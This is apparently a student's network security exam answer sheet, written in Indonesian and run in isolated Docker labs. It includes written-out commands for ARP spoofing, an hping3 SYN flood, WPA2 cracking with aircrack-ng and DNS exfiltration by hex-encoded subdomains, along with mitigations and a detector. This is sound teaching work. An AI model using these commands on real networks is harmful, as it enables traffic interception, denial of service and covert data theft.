# JAWABAN UTS Praktik Network Security

**NIM:** 24552011027
**Kasus:** 9 (k9)

## Perhitungan Kasus

- Digit NIM: 2, 4, 5, 5, 2, 0, 1, 1, 0, 2, 7
- Jumlah digit: 2+4+5+5+2+0+1+1+0+2+7 = 29
- Sisa bagi 10: 29 mod 10 = 9
- Kasus yang diterima: 9

---

## Daftar Screenshot

Screenshot semua langkah tersimpan di folder `ss/tugas 1` … `ss/tugas 7`,
nama file mengikuti nomor langkah di tiap bagian. Setiap screenshot ditanam
di bagian **Bukti** tugasnya masing-masing lengkap dengan penjelasan singkat.

| Urutan | Tugas | File screenshot |
|---|---|---|
| 1 | T1 — buat volume + tulis NIM | `ss/tugas 1/1-2. buat volume + tulis NIM.png` |
| 2 | T1 — hapus container sumber | `ss/tugas 1/3. hapus container sumber.png` |
| 3 | T1 — baca lewat container baru | `ss/tugas 1/4. baca lewat container BARU .png` |
| 4 | T1 — compose B1 up | `ss/tugas 1/5. compose B1.png` |
| 5 | T1 — attacker akses target | `ss/tugas 1/6. attacker -> target.png` |
| 6 | T2 — AES-256 roundtrip + dua hash | `ss/tugas 2/1-3. AES-256 roundtrip + dua hash.png` |
| 7 | T2 — sertifikat self-signed | `ss/tugas 2/4. sertifikat self-signed.png` |
| 8 | T3 — siapkan lab (3 container) | `ss/tugas 3/1. siapkan lab.png` |
| 9 | T3 — ambil IP & MAC | `ss/tugas 3/2. ambilIP-MAC.png` |
| 10 | T3 — bikin entry ARP muncul | `ss/tugas 3/3. bikin entry ARP muncul.png` |
| 11 | T3 — tabel ARP SEBELUM | `ss/tugas 3/4. SEBELUM.png` |
| 12 | T3 — arpspoof dijalankan | `ss/tugas 3/5. SAAT DISERANG.png` |
| 13 | T3 — tabel ARP SAAT DISPOOF | `ss/tugas 3/6. SAAT DISPOOF.png` |
| 14 | T3 — mitigasi static ARP | `ss/tugas 3/7. MITIGASI static ARP.png` |
| 15 | T3 — tabel ARP SETELAH | `ss/tugas 3/8. SETELAH MITIGASI.png` |
| 16 | T4 — output aircrack-ng | `ss/tugas 4/01-aircrack.png` |
| 17 | T5 — ambil IP korban | `ss/tugas 5/ambil IP korban.png` |
| 18 | T5 — ICMP echo request | `ss/tugas 5/3. ICMP echo request.png` |
| 19 | T5 — sweep host hidup | `ss/tugas 5/4. sweep host hidup.png` |
| 20 | T6 — jalankan lab B3 | `ss/tugas 6/1. jalankan lab.png` |
| 21 | T6 — SYN_RECV SEBELUM | `ss/tugas 6/2. SEBELUM.png` |
| 22 | T6 — SYN_RECV SAAT SERANGAN | `ss/tugas 6/3-4. SAAT SERANGAN.png` |
| 23 | T6 — tcpdump handshake | `ss/tugas 6/5. tangkap handshake (S=SYN, S.=SYN-ACK, .=ACK) — SCREENSHOT 02-tcpdump-handshake.png.png` |
| 24 | T6 — bersihkan (down -v) | `ss/tugas 6/6. bersihkan.png` |
| 25 | T7 — jalankan lab B4 | `ss/tugas 7/1. jalankan lab.png` |
| 26 | T7 — encode jadi hex | `ss/tugas 7/2-3. encode jadi hex.png` |
| 27 | T7 — kirim kedua query | `ss/tugas 7/4. kirim kedua query.png` |
| 28 | T7 — log + deteksi | `ss/tugas 7/5. log + deteksi .png` |
| 29 | T7 — decode balik | `ss/tugas 7/6. decode balik.png` |
| 30 | T7 — bersihkan (down -v) | `ss/tugas 7/7. bersihkan.png` |

### Aturan teknis (penting)

1. **Semua perintah di bawah ber sintaks bash.** Shell default kamu **fish** —
   jadi jalankan dulu `bash` di prompt sebelum menyalin perintah, atau pakai
   script (di fish, `VAR=$(cmd)` akan error).
2. Pakai **`docker-compose`** (tanda hubung) — plugin `docker compose` tidak
   terpasang di laptop ini.
3. OpenSSL modern wajib awalan **`-pass pass:`**.
4. **T3 jangan di-`down`** sebelum T5 selesai — T5 butuh container `*-k9`.
5. **Screenshot dulu, baru `down -v`** — output hilang kalau container sudah
   dihapus.
6. Jalankan semua perintah dari folder root repo:
   ```bash
   cd "/home/purwa/Documents/perkuliahan/keamanan jaringan/network-attack-lab-"
   ```

---

## Tugas 1 (Pertemuan 1): Docker & Volume

### Urutan langkah

1. Buat volume `vol-k9`.
2. Jalankan container `w-k9` yang menulis NIM ke `/data/laporan-k9.txt`.
   → `ss/tugas 1/1-2. buat volume + tulis NIM.png`
3. **Hapus** container `w-k9`.
   → `ss/tugas 1/3. hapus container sumber.png`
4. Baca file lewat **container baru** yang memasang volume sama — bukti data bertahan.
   → `ss/tugas 1/4. baca lewat container BARU .png`
5. Jalankan compose B1 (jaringan `internal: true`).
   → `ss/tugas 1/5. compose B1.png`
6. Dari container `attacker`, akses `http://target`.
   → `ss/tugas 1/6. attacker -> target.png`
7. Bawa turun compose (`down -v`).

### Command

```bash
# 1-2. buat volume + tulis NIM
docker volume create vol-k9
docker run --name w-k9 -v vol-k9:/data alpine:3.20 sh -c 'echo 24552011027 > /data/laporan-k9.txt'

# 3. hapus container sumber
docker rm w-k9

# 4. baca lewat container BARU (data harus masih ada)
docker run --rm -v vol-k9:/data alpine:3.20 cat /data/laporan-k9.txt

# 5. compose B1
docker-compose -p k9 -f 01-sumber-lab/b/b1-compose/docker-compose.yml up -d

# 6. attacker -> target
docker-compose -p k9 -f 01-sumber-lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target

# 7. bersihkan
docker-compose -p k9 -f 01-sumber-lab/b/b1-compose/docker-compose.yml down -v
```

### Bukti

**Langkah 1–2 — volume dibuat & NIM ditulis:**

![buat volume + tulis NIM](<ss/tugas 1/1-2. buat volume + tulis NIM.png>)

> Volume `vol-k9` dibuat dan container `w-k9` menulis NIM 24552011027 ke `/data/laporan-k9.txt`.

**Langkah 3 — container sumber dihapus:**

![hapus container sumber](<ss/tugas 1/3. hapus container sumber.png>)

> `docker rm w-k9` menghapus kontainernya saja; volume `vol-k9` tetap ada di host.

**Langkah 4 — data terbaca dari container BARU:**

![baca lewat container baru](<ss/tugas 1/4. baca lewat container BARU .png>)

> Container baru yang memasang volume yang sama masih membaca NIM 24552011027 — bukti data bertahan setelah container sumber dihapus.

**Langkah 5 — compose B1 up:**

![compose B1](<ss/tugas 1/5. compose B1.png>)

> Compose B1 menjalankan `target` (nginx) dan `attacker` pada jaringan `lab` dengan `internal: true` (tanpa akses internet).

**Langkah 6 — attacker → target:**

![attacker ke target](<ss/tugas 1/6. attacker -> target.png>)

> `wget` dari container attacker menampilkan halaman HTML nginx `target` — komunikasi antar-container di jaringan internal berfungsi.

### Penjelasan

<!-- Tulis di sini: bagaimana volume mempertahankan data setelah container dihapus.
     Poin kunci: volume adalah direktori di HOST yang dipasang ke container;
     data tinggal di host, bukan di lapisan container. `docker rm w-k9` hanya
     menghapus kontainer-nya — `vol-k9` tetap ada. Container baru yang memasang
     volume yang sama melihat isi yang sama. -->

---

## Tugas 2 (Pertemuan 2): Kriptografi

### Urutan langkah

1. Enkripsi `laporan-k9.txt` dengan AES-256-CBC + PBKDF2, kunci `kunci-k9-2026`.
2. Hitung SHA-256 plaintext.
3. Dekripsi balik ke `hasil-k9.txt`, hitung SHA-256 — **dua hash harus sama**.
   → `ss/tugas 2/1-3. AES-256 roundtrip + dua hash.png`
4. Buat sertifikat self-signed RSA 2048 valid 30 hari, tampilkan Subject/Issuer/tanggal.
   → `ss/tugas 2/4. sertifikat self-signed.png`

### Command

```bash
# 1-3. AES-256 roundtrip + dua hash
docker run --rm -v "$PWD":/work uts-openssl sh -c '
  echo isi laporan k9 > laporan-k9.txt &&
  openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k9.txt -out laporan-k9.enc -pass pass:kunci-k9-2026 &&
  echo "--- hash plaintext ---" && sha256sum laporan-k9.txt &&
  openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k9.enc -out hasil-k9.txt -pass pass:kunci-k9-2026 &&
  echo "--- hash hasil dekripsi (HARUS SAMA) ---" && sha256sum hasil-k9.txt'

# 4. sertifikat self-signed
docker run --rm -v "$PWD":/work uts-openssl sh -c '
  openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k9.pem -out cert-k9.pem -days 30 -subj /CN=k9.uts.local &&
  openssl x509 -in cert-k9.pem -noout -subject -issuer -dates'
```

### Bukti

**Langkah 1–3 — enkripsi, dekripsi, dan dua hash SHA-256:**

![AES-256 roundtrip](<ss/tugas 2/1-3. AES-256 roundtrip + dua hash.png>)

> File dienkripsi AES-256-CBC lalu didekripsi balik; hash SHA-256 plaintext dan hasil dekripsi **identik** — dekripsi berhasil dan data tidak berubah.

**Langkah 4 — sertifikat self-signed:**

![sertifikat self-signed](<ss/tugas 2/4. sertifikat self-signed.png>)

> Sertifikat X.509 self-signed (Subject = Issuer = `CN=k9.uts.local`), RSA 2048, berlaku 30 hari.

### Penjelasan

<!-- Tulis di sini: perbedaan sertifikat self-signed dan CA-signed.
     Poin kunci: self-signed — Subject == Issuer karena pihak yang
     menandatangani adalah dirinya sendiri; cocok untuk lab, tetapi browser
     tidak mempercayainya karena tidak ada rantai kepercayaan. CA-signed —
     Subject ditandatangani oleh Certificate Authority yang sudah dipercaya
     sistem, sehingga rantai kepercayaannya bisa diverifikasi sampai root CA. -->

---

## Tugas 3 (Pertemuan 3): ARP Spoofing

### Urutan langkah

1. Buat network `lab-arp-k9` + 3 container: `korban-k9`, `gateway-k9`, `penyerang-k9`.
   → `ss/tugas 3/1. siapkan lab.png`
2. Ambil IP korban, IP gateway, dan MAC gateway.
   → `ss/tugas 3/2. ambilIP-MAC.png`
3. Paksa entry ARP korban ke MAC gateway asli + ping (supaya entry ARP muncul).
   → `ss/tugas 3/3. bikin entry ARP muncul.png`
4. **Sebelum** spoofing: tampilkan tabel ARP korban.
   → `ss/tugas 3/4. SEBELUM.png`
5. Jalankan `arpspoof` dari penyerang, polling sampai MAC berubah.
   → `ss/tugas 3/5. SAAT DISERANG.png`
6. **Saat dispoof**: tampilkan tabel ARP korban + bandingkan MAC.
   → `ss/tugas 3/6. SAAT DISPOOF.png`
7. **Mitigasi**: static ARP (`nud permanent`) ke MAC gateway asli.
   → `ss/tugas 3/7. MITIGASI static ARP.png`
8. **Setelah mitigasi**: tampilkan tabel ARP korban.
   → `ss/tugas 3/8. SETELAH MITIGASI.png`

> ⚠️ Jangan hapus container/network ini sampai Tugas 5 selesai.

### Command

```bash
# 1. siapkan lab
docker network create lab-arp-k9 2>/dev/null || echo "(network sudah ada)"
for n in korban gateway penyerang; do docker rm -f ${n}-k9 2>/dev/null; done
docker run -d --name korban-k9    --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k9   --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
sleep 3

# 2. ambil IP/MAC (Go template butuh index karena nama network mengandung '-')
IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)
IP_GW=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' gateway-k9)
MAC_GW=$(docker exec gateway-k9 cat /sys/class/net/eth0/address)
echo "korban=$IP_KORBAN  gateway=$IP_GW  mac_gateway=$MAC_GW"

# 3. bikin entry ARP muncul (jangan pakai 'ip neigh del' — justru merusak poisoning)
docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud reachable dev eth0
docker exec korban-k9 ping -c 2 "$IP_GW" >/dev/null 2>&1

# 4. SEBELUM
echo "--- 1. SEBELUM (MAC gateway BENAR) ---"
docker exec korban-k9 ip neigh show "$IP_GW"

# 5. SAAT DISERANG
docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GW"
# polling sampai MAC berubah (maks 12 detik)
for i in $(seq 1 12); do
  sleep 1
  MAC_NOW=$(docker exec korban-k9 ip neigh show "$IP_GW" | sed -n 's/.*lladdr \([0-9a-f:]*\).*/\1/p')
  [ "$MAC_NOW" != "$MAC_GW" ] && break
done

# 6. SAAT DISPOOF
echo "--- 2. SAAT DISERANG ---"
docker exec korban-k9 ip neigh show "$IP_GW"
echo "mac gateway asli : $MAC_GW"
echo "mac penyerang    : $(docker exec penyerang-k9 cat /sys/class/net/eth0/address)"

# 7. MITIGASI static ARP
docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud permanent dev eth0

# 8. SETELAH MITIGASI
echo "--- 3. SETELAH MITIGASI ---"
docker exec korban-k9 ip neigh show "$IP_GW"
```

### Bukti

**Langkah 1 — siapkan lab (3 container):**

![siapkan lab](<ss/tugas 3/1. siapkan lab.png>)

> Tiga container (`korban-k9`, `gateway-k9`, `penyerang-k9`) dijalankan pada network `lab-arp-k9` dengan kapabilitas `NET_ADMIN`.

**Langkah 2 — ambil IP & MAC:**

![ambil IP dan MAC](<ss/tugas 3/2. ambilIP-MAC.png>)

> IP korban, IP gateway, dan MAC gateway asli dicatat — inilah nilai pembanding untuk membuktikan poisoning.

**Langkah 3 — bikin entry ARP muncul:**

![bikin entry ARP muncul](<ss/tugas 3/3. bikin entry ARP muncul.png>)

> Entry ARP korban dipaksa ke MAC gateway asli lalu di-ping, supaya tabel ARP punya baseline yang bisa dibandingkan.

**Langkah 4 — SEBELUM spoofing:**

![tabel ARP sebelum](<ss/tugas 3/4. SEBELUM.png>)

> Tabel ARP korban menunjukkan IP gateway terpetakan ke **MAC gateway yang benar**.

**Langkah 5 — arpspoof dijalankan:**

![saat diserang](<ss/tugas 3/5. SAAT DISERANG.png>)

> `arpspoof` berjalan dari container penyerang, memberi ARP reply palsu ke korban; polling menunggu sampai MAC berubah.

**Langkah 6 — tabel ARP SAAT DISPOOF:**

![tabel ARP saat dispoof](<ss/tugas 3/6. SAAT DISPOOF.png>)

> MAC untuk IP gateway di korban **berubah jadi MAC penyerang** — trafik korban → gateway kini melewati penyerang (posisi MITM).

**Langkah 7 — mitigasi static ARP:**

![mitigasi static ARP](<ss/tugas 3/7. MITIGASI static ARP.png>)

> Entry di-pin kembali ke MAC gateway asli dengan `nud permanent` — ARP reply tak terjadwal tidak bisa menimpanya.

**Langkah 8 — SETELAH mitigasi:**

![tabel ARP setelah mitigasi](<ss/tugas 3/8. SETELAH MITIGASI.png>)

> MAC kembali ke nilai asli dengan state **PERM** — tabel ARP pulih normal setelah mitigasi.

### Penjelasan

<!-- Tulis di sini: bagaimana static ARP binding mengembalikan MAC normal.
     Poin kunci: sebelum → MAC gateway asli. Saat dispoof → MAC berubah jadi
     milik penyerang, sehingga trafik korban→gateway terarah ke penyerang
     (posisi MITM). Setelah `nud permanent` → entry di-pin ke MAC asli dan
     ARP reply tak terjadwal tidak bisa menimpanya. Mitigasi lain: Dynamic
     ARP Inspection (DAI) pada switch + DHCP snooping. -->

---

## Tugas 4 (Pertemuan 4): WPA2 Cracking

### Urutan langkah

1. Jalankan `aircrack-ng` dengan wordlist kasus 9 melawan capture handshake kasus 9.
2. Screenshot output.
   → `ss/tugas 4/01-aircrack.png`

> ⚠️ **Catatan jujur:** file `handshake-k9.cap` yang disediakan ternyata
> **bukan capture 802.11 yang valid** (linktype Ethernet, 0 paket wireless).
> `aircrack-ng` melaporkan *"This file is not a regular 802.11 (wireless)
> capture … No networks found"* — bukan `KEY FOUND`/`KEY NOT FOUND`.
> Output ditampilkan apa adanya, lalu penjelasan 4-way handshake tetap
> ditulis lengkap. File sample ada di `01-sumber-lab/samples/`.

### Command

```bash
docker run --rm -v "$PWD/01-sumber-lab/samples":/work uts-kali-tools \
  aircrack-ng -w wordlist-k9.txt handshake-k9.cap
```

### Bukti

**Langkah 1 — output aircrack-ng:**

![aircrack-ng](<ss/tugas 4/01-aircrack.png>)

> `aircrack-ng` membaca capture dengan wordlist `wordlist-k9.txt`; file bawaan ternyata bukan capture 802.11 valid sehingga keluar *"No networks found"* (0 paket wireless terbaca).

### Penjelasan

<!-- Tulis di sini (lengkap): 4 frame WPA2 handshake + kenapa bisa di-crack offline.
     4-way handshake:
     1. AP → Client (EAPOL msg 1): AP mengirim nilai acak ANonce.
     2. Client → AP (msg 2): client membuat SNonce, menghitung PMK dari
        passphrase+SSID (PBKDF2, 4096 iterasi), derive PTK dari PMK+ANonce+
        SNonce+kedua MAC, lalu membalas SNonce + MIC.
     3. AP → Client (msg 3): AP mengderive PTK yang sama, memverifikasi MIC,
        lalu mengirim GTK + MIC-nya.
     4. Client → AP (msg 4): client memasang kunci dan mengonfirmasi.
     Kenapa crackable offline: penyerang merekam msg 1+2 (ANonce, SNonce,
     kedua MAC, MIC). Empat input itu + tebakan passphrase cukup untuk
     menghitung ulang PTK dan memeriksa apakah MIC cocok — sepenuhnya offline,
     tanpa paket ke AP, tanpa lockout/log. Keamanan = entropi passphrase.
     Mitigasi: passphrase panjang acak (diceware), WPA3-SAE (resisten offline
     dictionary attack), 802.1X/EAP-TLS untuk enterprise. -->

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

### Urutan langkah

1. Pastikan container `korban-k9` masih hidup (jalankan **setelah** Tugas 3, sebelum dihapus).
2. Ambil IP korban.
   → `ss/tugas 5/ambil IP korban.png`
3. Kirim ICMP echo request via `kirim_icmp.py`, baca TTL & tipe balasan.
   → `ss/tugas 5/3. ICMP echo request.png`
4. Sweep hanya IP container yang ada di network (jangan scan subnet /16 penuh).
   → `ss/tugas 5/4. sweep host hidup.png`

### Command

```bash
# ambil IP korban
IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)

# 3. ICMP echo request
docker run --rm --network lab-arp-k9 -v "$PWD/01-sumber-lab/kasus/k5-scapy":/work uts-kali-tools \
  python3 /work/kirim_icmp.py "$IP_KORBAN"

# 4. sweep host hidup
HOSTS=$(docker network inspect lab-arp-k9 -f '{{range .Containers}}{{.IPv4Address}} {{end}}' | tr ' ' '\n' | grep -v '^$' | cut -d/ -f1 | paste -sd, -)
echo "host yang discan: $HOSTS"
docker run --rm --network lab-arp-k9 uts-kali-tools python3 -c "
from scapy.all import ICMP, IP, sr
ans, _ = sr(IP(dst='$HOSTS'.split(','))/ICMP(), timeout=3, verbose=False)
print('Host hidup:')
for sent, recv in ans:
    print('   ', recv.src, 'ttl=', recv[IP].ttl, 'type=', recv[ICMP].type)
"
```

### Bukti

**Langkah 2 — ambil IP korban:**

![ambil IP korban](<ss/tugas 5/ambil IP korban.png>)

> IP container `korban-k9` diambil dari `docker inspect` sebagai target ICMP.

**Langkah 3 — ICMP echo request (Scapy):**

![ICMP echo request](<ss/tugas 5/3. ICMP echo request.png>)

> `kirim_icmp.py` mengirim echo request; balasan datang dengan **type 0 (echo reply)** dan **TTL 64** — target hidup dan paket terbentuk benar.

**Langkah 4 — sweep host hidup:**

![sweep host hidup](<ss/tugas 5/4. sweep host hidup.png>)

> Sweep hanya 3 IP container di network: ketiganya hidup dengan `ttl=64 type=0` (hop = 0 di satu network Docker).

### Penjelasan

<!-- Tulis di sini: smurf attack + arti TTL/tipe.
     Poin kunci: balasan ICMP type 0 (echo reply), TTL 64 = TTL awal minus
     hop; di network Docker yang sama hop=0 jadi TTL tetap 64 (dasar
     traceroute). Smurf: penyerang spoof source IP = korban, mengirim echo ke
     alamat broadcast jaringan — semua host segmen itu balas, tapi balasannya
     ke KORBAN. 1 paket → N balasan (amplifikasi). ICMP echo bukan serangan;
     kombinasi source yang bisa di-spoof + amplifikasi broadcast yang jadi
     masalah. Mitigasi: matikan directed broadcast di router
     (`no ip directed-broadcast`), rate-limit ICMP, ingress/egress filtering
     (BCP 38 / uRPF), drop ICMP ke broadcast. -->

---

## Tugas 6 (Pertemuan 6): SYN Flood

### Urutan langkah

1. Jalankan compose B3 (`target` nginx + `attacker` uts-kali-tools).
   → `ss/tugas 6/1. jalankan lab.png`
2. Hitung `SYN_RECV` **sebelum** serangan.
   → `ss/tugas 6/2. SEBELUM.png`
3. Jalankan flood `hping3` 15 detik, tunggu 5 detik.
4. Hitung `SYN_RECV` **saat** serangan.
   → `ss/tugas 6/3-4. SAAT SERANGAN.png`
5. Selama flood, tangkap handshake sah dengan `tcpdump` + `curl`.
   → `ss/tugas 6/5. tangkap handshake (S=SYN, S.=SYN-ACK, .=ACK) — SCREENSHOT 02-tcpdump-handshake.png.png`
6. Bawa turun compose (`down -v`).
   → `ss/tugas 6/6. bersihkan.png`

### Command

```bash
# 1. jalankan lab
docker-compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml up -d
sleep 3

# 2. SEBELUM
echo "--- 1. SEBELUM SERANGAN: jumlah SYN_RECV ---"
docker-compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec -T target netstat -ant | grep -c SYN_RECV

# 3-4. SAAT SERANGAN
docker-compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
sleep 5
echo "--- 2. SAAT SERANGAN: jumlah SYN_RECV ---"
docker-compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec -T target netstat -ant | grep -c SYN_RECV

# 5. tangkap handshake (S=SYN, S.=SYN-ACK, .=ACK)
docker-compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml exec -T attacker sh -c \
  'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target >/dev/null; sleep 10'

# 6. bersihkan
docker-compose -p k9 -f 01-sumber-lab/b/b3-syn-flood/docker-compose.yml down -v
```

### Bukti

**Langkah 1 — jalankan lab B3:**

![jalankan lab](<ss/tugas 6/1. jalankan lab.png>)

> Compose B3 menjalankan `target` (nginx) dan `attacker` (hping3) pada jaringan internal.

**Langkah 2 — SYN_RECV SEBELUM serangan:**

![SYN_RECV sebelum](<ss/tugas 6/2. SEBELUM.png>)

> Hitungan `SYN_RECV` baseline di target sebelum flood dimulai.

**Langkah 3–4 — SYN_RECV SAAT SERANGAN:**

![SYN_RECV saat serangan](<ss/tugas 6/3-4. SAAT SERANGAN.png>)

> Selama `hping3 --flood`, `SYN_RECV` naik — antrean koneksi half-open target terisi oleh SYN yang tak pernah diselesaikan.

**Langkah 5 — tcpdump tangkap handshake:**

![tcpdump handshake](<ss/tugas 6/5. tangkap handshake (S=SYN, S.=SYN-ACK, .=ACK) — SCREENSHOT 02-tcpdump-handshake.png.png>)

> `tcpdump` menangkap 3-way handshake sah di tengah flood: `Flags [S]` (SYN) → `Flags [S.]` (SYN-ACK) → `Flags [.]` (ACK).

**Langkah 6 — bersihkan lab:**

![bersihkan](<ss/tugas 6/6. bersihkan.png>)

> Compose dibawa turun dengan `down -v` setelah bukti lengkap — tidak ada sisa container.

### Penjelasan

<!-- Tulis di sini: mitigasi SYN flood (SYN cookies) + 3-way handshake.
     Poin kunci: 3-way handshake = SYN → SYN-ACK → ACK; kerentanannya di
     langkah 2→3, server harus menyimpan state (TCB, SYN_RECV) untuk client
     yang belum membuktikan keberadaannya. Flood SYN dengan source spoofed
     menumpuk backlog dengan entri yang tak akan pernah selesai → client sah
     ditolak (availability hilang tanpa exploit/kredensial). Mitigasi utama:
     SYN cookies (net.ipv4.tcp_syncookies=1) — state disimpan di sequence
     number SYN-ACK, TCB baru dibuat saat ACK final, jadi backlog tak bisa
     ditumpuk. Plus: tuning backlog, rate limit per-source SYN, uRPF/BCP 38. -->

---

## Tugas 7 (Pertemuan 7): DNS Exfiltration

### Urutan langkah

1. Jalankan compose B4 (`dns` dnsmasq + `attacker`).
   → `ss/tugas 7/1. jalankan lab.png`
2. Encode NIM menjadi hex. Catat panjang labelnya.
3. Encode payload tambahan `rahasia-nilai-uts-k9` menjadi hex (40 karakter — di atas ambang detektor 30).
   → `ss/tugas 7/2-3. encode jadi hex.png`
4. Kirim kedua query dari `attacker` ke resolver `dns`.
   → `ss/tugas 7/4. kirim kedua query.png`
5. Simpan log resolver, jalankan `analisis_dns.py`.
   → `ss/tugas 7/5. log + deteksi .png`
6. Decode kedua label kembali ke pesan asli.
   → `ss/tugas 7/6. decode balik.png`
7. Bawa turun compose (`down -v`).
   → `ss/tugas 7/7. bersihkan.png`

> Kenapa dua query? Label hex NIM hanya 22 karakter → **di bawah ambang
> detektor (>30)**, jadi tidak ditandai. Payload 40 karakter → **di atas
> ambang** dan ≤63 (batas maks satu label DNS), jadi terdeteksi. Ini juga
> bahan penjelasan bagus: exfiltration nyata membawa data besar, bukan satu NIM.

### Command

```bash
# 1. jalankan lab
docker-compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml up -d
sleep 4

# 2-3. encode jadi hex
NIM=24552011027
HEX=$(echo -n "$NIM" | xxd -p)
PAYLOAD="rahasia-nilai-uts-k9"
HEX_PAYLOAD=$(echo -n "$PAYLOAD" | xxd -p)
echo "NIM saja   : $HEX   (panjang: $(echo -n $HEX | wc -c))"
echo "payload    : $HEX_PAYLOAD   (panjang: $(echo -n $HEX_PAYLOAD | wc -c))"

# 4. kirim kedua query
echo "query (a) NIM saja:"
docker-compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml exec -T attacker dig +short "$HEX.k9.exfil.lab" @dns
echo "query (b) payload:"
docker-compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml exec -T attacker dig +short "$HEX_PAYLOAD.k9.exfil.lab" @dns

# 5. log + deteksi
docker-compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
python3 01-sumber-lab/kasus/k9-dns-detect/analisis_dns.py dns-k9.log

# 6. decode balik
echo -n "  query (a) NIM     : "; echo "$HEX" | xxd -r -p; echo
echo -n "  query (b) payload : "; echo "$HEX_PAYLOAD" | xxd -r -p; echo

# 7. bersihkan
docker-compose -p k9 -f 01-sumber-lab/b/b4-dns-exfil/docker-compose.yml down -v
```

### Bukti

**Langkah 1 — jalankan lab B4:**

![jalankan lab](<ss/tugas 7/1. jalankan lab.png>)

> Compose B4 menjalankan resolver `dns` (dnsmasq) dan `attacker` pada jaringan internal.

**Langkah 2–3 — encode jadi hex:**

![encode jadi hex](<ss/tugas 7/2-3. encode jadi hex.png>)

> NIM dan payload di-encode hex; label NIM 22 karakter (di bawah ambang 30) dan label payload 40 karakter (di atas ambang) — keduanya ≤63 karakter maks satu label DNS.

**Langkah 4 — kirim kedua query:**

![kirim kedua query](<ss/tugas 7/4. kirim kedua query.png>)

> Dua query DNS terkirim ke resolver `@dns` — data keluar jaringan hanya sebagai label subdomain biasa.

**Langkah 5 — log + deteksi:**

![log dan deteksi](<ss/tugas 7/5. log + deteksi .png>)

> `analisis_dns.py` menganalisis log resolver dan **menandai label panjang murni hex** di bagian "Query mencurigakan".

**Langkah 6 — decode balik:**

![decode balik](<ss/tugas 7/6. decode balik.png>)

> `xxd -r -p` mengembalikan kedua label hex menjadi pesan asli (NIM dan payload) — data berhasil direkonstruksi purna dari DNS saja.

**Langkah 7 — bersihkan lab:**

![bersihkan](<ss/tugas 7/7. bersihkan.png>)

> Compose dibawa turun dengan `down -v` setelah bukti lengkap — tidak ada sisa container.

### Penjelasan

<!-- Tulis di sini: indikator deteksi DNS exfiltration + kenapa sulit diblokir.
     Poin kunci: data di-encode hex ke label subdomain kiri dari query DNS.
     Detektor menandai label >30 karakter DAN murni hex (pola yang hampir
     mustahil pada hostname normal). DNS hampir mustahil diblokir firewall
     karena resolusi nama adalah prasyarat hampir semua trafik → jadi covert
     channel. Catatan teknis: label NIM 22 char tidak kena ambang; satu label
     DNS maksimal 63 char, hex 83 char ditolak dig ("label too long") — itu
     sebabnya exfiltration asli memakai banyak query berurutan. Mitigasi:
     log & monitor DNS, analisis panjang/entropi label + spike NXDOMAIN,
     Response Policy Zones (RPZ), PAKSA semua DNS lewat resolver internal
     terkontrol (blokir UDP/TCP 53 keluar — kontrol nilai tertinggi),
     restrict egress. -->

---

## Kesimpulan

Saya telah menyelesaikan semua 7 tugas dengan output dan penjelasan yang diminta.

**Total waktu:** <!-- [jam:menit] -->

**Catatan teknis:**
- File `handshake-k9.cap` yang disediakan bukan capture 802.11 valid
  (linktype Ethernet, 0 paket wireless), sehingga `aircrack-ng` tidak
  menemukan jaringan — output Tugas 4 ditampilkan apa adanya beserta penjelasan
  4-way handshake.
- Semua serangan dijalankan pada jaringan Docker `internal: true` di lab
  lokal; tidak ada host di luar lab yang dipindai atau diserang.